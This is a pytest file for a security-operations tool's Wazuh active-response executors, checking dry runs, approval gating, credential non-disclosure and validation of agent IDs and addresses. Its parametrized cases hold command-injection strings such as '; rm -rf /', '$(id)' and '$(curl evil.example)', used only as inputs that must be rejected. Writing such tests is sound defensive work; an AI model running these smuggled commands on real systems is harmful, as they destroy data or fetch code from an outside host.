
"""Tests for the Wazuh active-response executors.

Every test drives an injected fake Manager client, so no HTTP request is ever
made. The two things these tests care about most are that a dry run sends
nothing at all, and that neither an agent ID nor an address reaches a request
body without being validated first: the arguments of a Wazuh active-response
command are consumed by a script running as root on the endpoint.
"""

from __future__ import annotations

import json
from datetime import UTC, datetime
from typing import Any

import pytest

from soc.models import (
    AnalysisSource,
    FalsePositiveLikelihood,
    TriageAction,
    TriageResult,
)
from soc.playbooks import Playbook
from soc.response import ResponseActionType, ResponseGate, ResponseStatus
from soc.wazuh_response import (
    WAZUH_ACTIVE_RESPONSE_METHOD,
    WAZUH_ACTIVE_RESPONSE_PATH,
    WAZUH_AGENTS_LIST_FIELD,
    WAZUH_ARGUMENTS_FIELD,
    WAZUH_COMMAND_FIELD,
    WAZUH_FIREWALL_DROP_COMMAND,
    WAZUH_HOST_DENY_COMMAND,
    WAZUH_ROLLBACK_UNAVAILABLE,
    WazuhFirewallDropExecutor,
    WazuhHostDenyExecutor,
    WazuhResponseError,
    parse_wazuh_target,
)

BASE_TIME = datetime(2026, 8, 5, 12, 0, tzinfo=UTC)

SECRET_PASSWORD = "manager-api-password-not-for-disclosure"
SECRET_TOKEN = "jwt-token-not-for-disclosure"


class FakeManagerConfig:
    """Stand-in for WazuhManagerConfig holding a credential."""

    def __init__(self) -> None:
        """Initialize the fake config."""

        self.url = "https://wazuh-manager.example:55000"
        self.username = "api-user"
        self.password = SECRET_PASSWORD


class FakeManagerClient:
    """Fake WazuhManagerClient recording requests instead of sending them."""

    def __init__(self, response: dict[str, Any] | None = None, error: Exception | None = None) -> None:
        """Initialize the fake client.

        Inputs:
            response: JSON object to return from request().
            error: Exception to raise from request() instead of returning.

        Outputs:
            None.
        """

        self.calls: list[dict[str, Any]] = []
        self.response = response if response is not None else _ok_response()
        self.error = error
        self.config = FakeManagerConfig()
        self.token = SECRET_TOKEN

    def request(
        self,
        method: str,
        path: str,
        *,
        query: dict[str, str] | None = None,
        body: dict[str, Any] | None = None,
    ) -> dict[str, Any]:
        """Record one request and return the configured response.

        Inputs:
            method: HTTP method.
            path: API path.
            query: Query parameters.
            body: JSON body.

        Outputs:
            Configured response object.

        Raises:
            Exception: The configured error, when one was supplied.
        """

        self.calls.append({"method": method, "path": path, "query": query, "body": body})
        if self.error is not None:
            raise self.error
        return self.response


def _ok_response(agent_id: str = "001") -> dict[str, Any]:
    """Build a successful Wazuh active-response envelope.

    Inputs:
        agent_id: Agent the command was applied to.

    Outputs:
        Response object.
    """

    return {
        "data": {
            "affected_items": [agent_id],
            "total_affected_items": 1,
            "failed_items": [],
            "total_failed_items": 0,
        },
        "message": "AR command was sent to all agents",
    }


def _failed_response() -> dict[str, Any]:
    """Build a Wazuh envelope reporting a failed agent.

    Inputs:
        None.

    Outputs:
        Response object with one failed item.
    """

    return {
        "data": {
            "affected_items": [],
            "total_affected_items": 0,
            "failed_items": [
                {"error": {"code": 1701, "message": "Agent does not exist"}, "id": ["001"]}
            ],
            "total_failed_items": 1,
        }
    }


def _triage(score: int = 9, *, source: AnalysisSource = AnalysisSource.LLM) -> TriageResult:
    """Build a triage result eligible for an endpoint response.

    Inputs:
        score: Triage score.
        source: Whether the score came from a model.

    Outputs:
        TriageResult instance.
    """

    return TriageResult(
        id="triage-ar-1",
        target_id="CAND-1",
        target_type="incident_candidate",
        score=score,
        fp_likelihood=FalsePositiveLikelihood.LOW,
        classification="likely_true_positive",
        action=TriageAction.PAGE_NOW,
        summary="Confirmed endpoint compromise",
        model="vendor/model-x",
        analysis_source=source,
        prompt_version="triage-v1",
    )


def _playbook(action: ResponseActionType) -> Playbook:
    """Build a playbook for one endpoint action.

    Inputs:
        action: Response action the playbook proposes.

    Outputs:
        Playbook instance.
    """

    return Playbook(
        name=f"endpoint-{action.value}",
        action=action,
        required_confidence=9,
        description="Trigger a Wazuh active response on the affected agent.",
        requires_confirmation=True,
        trigger_actions=(TriageAction.PAGE_NOW,),
    )


def test_target_parsing_splits_agent_id_and_address():
    """A target carries both the agent to act on and the address to act against."""

    assert parse_wazuh_target("001/8.8.8.8") == ("001", "8.8.8.8")


def test_target_parsing_falls_back_to_the_configured_agent_id():
    """An executor bound to one agent may be given a bare address."""

    assert parse_wazuh_target("8.8.8.8", default_agent_id="002") == ("002", "8.8.8.8")


@pytest.mark.parametrize(
    "target",
    [
        "/8.8.8.8",
        "  /8.8.8.8",
        "001; rm -rf //8.8.8.8",
        "00 1/8.8.8.8",
        "../001/8.8.8.8",
        "001$(id)/8.8.8.8",
        "8.8.8.8",
    ],
)
def test_target_parsing_rejects_a_missing_or_malformed_agent_id(target):
    """An agent ID reaches an API path and a body, so it must be alphanumeric."""

    with pytest.raises(WazuhResponseError, match="agent"):
        parse_wazuh_target(target)


@pytest.mark.parametrize(
    "target",
    [
        "001/8.8.8.8; rm -rf /",
        "001/not-an-ip",
        "001/8.8.8.8/24",
        "001/",
        "001/$(curl evil.example)",
    ],
)
def test_target_parsing_rejects_a_malformed_or_malicious_address(target):
    """Command arguments run inside a root script on the endpoint."""

    with pytest.raises(WazuhResponseError, match="address"):
        parse_wazuh_target(target)


def test_firewall_drop_describe_states_the_command_and_the_agent_scope():
    """The recorded command must show exactly what would be sent, and to whom."""

    executor = WazuhFirewallDropExecutor(FakeManagerClient())

    command, _ = executor.describe("001/8.8.8.8")

    assert command.startswith(f"{WAZUH_ACTIVE_RESPONSE_METHOD} {WAZUH_ACTIVE_RESPONSE_PATH} ")
    payload = json.loads(command.split(" ", 2)[2])
    assert payload[WAZUH_COMMAND_FIELD] == WAZUH_FIREWALL_DROP_COMMAND
    assert payload[WAZUH_ARGUMENTS_FIELD] == ["8.8.8.8"]
    assert payload[WAZUH_AGENTS_LIST_FIELD] == ["001"]


def test_host_deny_describe_uses_the_host_deny_command():
    """Each executor must send its own command name."""

    executor = WazuhHostDenyExecutor(FakeManagerClient())

    command, _ = executor.describe("001/8.8.8.8")

    payload = json.loads(command.split(" ", 2)[2])
    assert payload[WAZUH_COMMAND_FIELD] == WAZUH_HOST_DENY_COMMAND


@pytest.mark.parametrize(
    "executor_class",
    [WazuhFirewallDropExecutor, WazuhHostDenyExecutor],
)
def test_describe_admits_that_no_rollback_exists(executor_class):
    """A rollback field that lies is worse than one that admits the limitation."""

    executor = executor_class(FakeManagerClient())

    _, rollback = executor.describe("001/8.8.8.8")

    assert rollback == WAZUH_ROLLBACK_UNAVAILABLE
    assert rollback.startswith("NO ROLLBACK AVAILABLE")
    # A rollback field that lies is worse than one that admits the limitation, so
    # it must not read as something an analyst could paste into a shell or send.
    for invented in ("pfctl", "curl", "PUT", "DELETE", WAZUH_ACTIVE_RESPONSE_PATH):
        assert invented not in rollback


@pytest.mark.parametrize(
    "executor_class",
    [WazuhFirewallDropExecutor, WazuhHostDenyExecutor],
)
def test_describe_is_pure_and_sends_nothing(executor_class):
    """The gate calls describe before deciding to act, so it must not act."""

    client = FakeManagerClient()
    executor = executor_class(client)

    executor.describe("001/8.8.8.8")
    executor.describe("001/8.8.8.8")

    assert client.calls == []


@pytest.mark.parametrize(
    "executor_class",
    [WazuhFirewallDropExecutor, WazuhHostDenyExecutor],
)
def test_dry_run_performs_no_transport_call(executor_class):
    """A dry run must produce a description and zero side effects."""

    client = FakeManagerClient()
    executor = executor_class(client)

    output = executor.execute("001/8.8.8.8", dry_run=True)

    assert client.calls == []
    assert "8.8.8.8" in output
    assert "001" in output
    assert "dry run" in output.lower()


def test_firewall_drop_sends_the_command_scoped_to_one_agent():
    """The request must name the command and scope it to the single agent."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client)

    output = executor.execute("001/8.8.8.8", dry_run=False)

    assert len(client.calls) == 1
    call = client.calls[0]
    assert call["method"] == WAZUH_ACTIVE_RESPONSE_METHOD
    assert call["path"] == WAZUH_ACTIVE_RESPONSE_PATH
    assert call["body"][WAZUH_COMMAND_FIELD] == WAZUH_FIREWALL_DROP_COMMAND
    assert call["body"][WAZUH_ARGUMENTS_FIELD] == ["8.8.8.8"]
    assert call["body"][WAZUH_AGENTS_LIST_FIELD] == ["001"]
    assert "001" in output


def test_host_deny_sends_the_host_deny_command():
    """The host-deny executor must not send the firewall-drop command."""

    client = FakeManagerClient()
    executor = WazuhHostDenyExecutor(client)

    executor.execute("001/8.8.8.8", dry_run=False)

    assert client.calls[0]["body"][WAZUH_COMMAND_FIELD] == WAZUH_HOST_DENY_COMMAND


def test_agent_scope_can_be_sent_as_a_query_parameter():
    """Whether the scope travels in the body or the query is deployment specific."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client, agent_scope_in_body=False)

    executor.execute("001/8.8.8.8", dry_run=False)

    call = client.calls[0]
    assert call["query"] == {WAZUH_AGENTS_LIST_FIELD: "001"}
    assert WAZUH_AGENTS_LIST_FIELD not in call["body"]


def test_a_constructor_agent_id_scopes_a_bare_address_target():
    """An executor may be bound to one agent so the target is just an address."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client, agent_id="007")

    executor.execute("8.8.8.8", dry_run=False)

    assert client.calls[0]["body"][WAZUH_AGENTS_LIST_FIELD] == ["007"]


def test_a_target_agent_id_overrides_the_constructor_agent_id():
    """A per-alert agent must win over a default, since the alert names the host."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client, agent_id="007")

    executor.execute("001/8.8.8.8", dry_run=False)

    assert client.calls[0]["body"][WAZUH_AGENTS_LIST_FIELD] == ["001"]


@pytest.mark.parametrize("agent_id", ["", "   ", "001; rm -rf /", "00 1"])
def test_a_malformed_constructor_agent_id_is_rejected(agent_id):
    """A bad default agent ID must be refused rather than sent."""

    client = FakeManagerClient()

    with pytest.raises(WazuhResponseError, match="agent"):
        WazuhFirewallDropExecutor(client, agent_id=agent_id).execute("8.8.8.8", dry_run=False)

    assert client.calls == []


def test_a_malicious_target_is_rejected_before_any_request():
    """Validation happens before the transport is touched, not after."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client)

    with pytest.raises(WazuhResponseError):
        executor.execute("001/8.8.8.8; rm -rf /", dry_run=False)

    assert client.calls == []


def test_a_malicious_target_is_rejected_even_in_a_dry_run():
    """Validation must not depend on whether the action would really happen."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client)

    with pytest.raises(WazuhResponseError):
        executor.execute("001/8.8.8.8; rm -rf /", dry_run=True)

    assert client.calls == []


def test_a_failed_item_raises_instead_of_reporting_success():
    """A refused agent must not be recorded as an executed response."""

    client = FakeManagerClient(response=_failed_response())
    executor = WazuhFirewallDropExecutor(client)

    with pytest.raises(WazuhResponseError, match="Agent does not exist"):
        executor.execute("001/8.8.8.8", dry_run=False)


def test_an_empty_affected_list_raises_instead_of_reporting_success():
    """Nothing happening is a failure, not a success with no detail."""

    client = FakeManagerClient(
        response={"data": {"affected_items": [], "total_affected_items": 0}}
    )
    executor = WazuhFirewallDropExecutor(client)

    with pytest.raises(WazuhResponseError, match="no agent"):
        executor.execute("001/8.8.8.8", dry_run=False)


def test_a_transport_error_is_not_swallowed():
    """A client failure must propagate so the gate records the action as FAILED."""

    client = FakeManagerClient(error=RuntimeError("Wazuh request failed for /active-response"))
    executor = WazuhFirewallDropExecutor(client)

    with pytest.raises(RuntimeError, match="request failed"):
        executor.execute("001/8.8.8.8", dry_run=False)


def test_no_credential_appears_in_output_or_errors():
    """Nothing this executor discloses may carry a password or a token."""

    client = FakeManagerClient()
    executor = WazuhFirewallDropExecutor(client)

    disclosed = [
        executor.execute("001/8.8.8.8", dry_run=True),
        executor.execute("001/8.8.8.8", dry_run=False),
        *executor.describe("001/8.8.8.8"),
    ]

    failing = FakeManagerClient(response=_failed_response())
    with pytest.raises(WazuhResponseError) as excinfo:
        WazuhFirewallDropExecutor(failing).execute("001/8.8.8.8", dry_run=False)
    disclosed.append(str(excinfo.value))

    for text in disclosed:
        assert SECRET_PASSWORD not in text
        assert SECRET_TOKEN not in text


def test_executors_declare_their_own_action():
    """The gate matches executors to proposals by action type."""

    client = FakeManagerClient()

    assert WazuhFirewallDropExecutor(client).action is ResponseActionType.WAZUH_FIREWALL_DROP
    assert WazuhHostDenyExecutor(client).action is ResponseActionType.WAZUH_HOST_DENY


@pytest.mark.parametrize(
    ("executor_class", "action", "command_name"),
    [
        (
            WazuhFirewallDropExecutor,
            ResponseActionType.WAZUH_FIREWALL_DROP,
            WAZUH_FIREWALL_DROP_COMMAND,
        ),
        (
            WazuhHostDenyExecutor,
            ResponseActionType.WAZUH_HOST_DENY,
            WAZUH_HOST_DENY_COMMAND,
        ),
    ],
)
def test_gate_executes_an_approved_proposal_through_each_executor(
    executor_class, action, command_name
):
    """End to end: both executors must satisfy the ResponseExecutor protocol."""

    client = FakeManagerClient()
    executor = executor_class(client)
    gate = ResponseGate([_playbook(action)], capability_enabled=lambda candidate: True)

    proposals = gate.propose(triage=_triage(), target="001/8.8.8.8")
    approved = gate.approve(proposals[0], analyst="atharv")
    executed = gate.execute(approved, executor=executor, dry_run=False)

    assert executed.status is ResponseStatus.EXECUTED
    assert command_name in executed.command
    assert executed.rollback_command == WAZUH_ROLLBACK_UNAVAILABLE
    assert executed.approved_by == "atharv"
    assert executed.error == ""
    assert len(client.calls) == 1


def test_gate_records_a_failed_active_response_without_faking_success():
    """A raised WazuhResponseError must be recorded as FAILED by the gate."""

    client = FakeManagerClient(response=_failed_response())
    executor = WazuhFirewallDropExecutor(client)
    gate = ResponseGate(
        [_playbook(ResponseActionType.WAZUH_FIREWALL_DROP)],
        capability_enabled=lambda candidate: True,
    )

    proposals = gate.propose(triage=_triage(), target="001/8.8.8.8")
    approved = gate.approve(proposals[0], analyst="atharv")
    executed = gate.execute(approved, executor=executor, dry_run=False)

    assert executed.status is ResponseStatus.FAILED
    assert "Agent does not exist" in executed.error
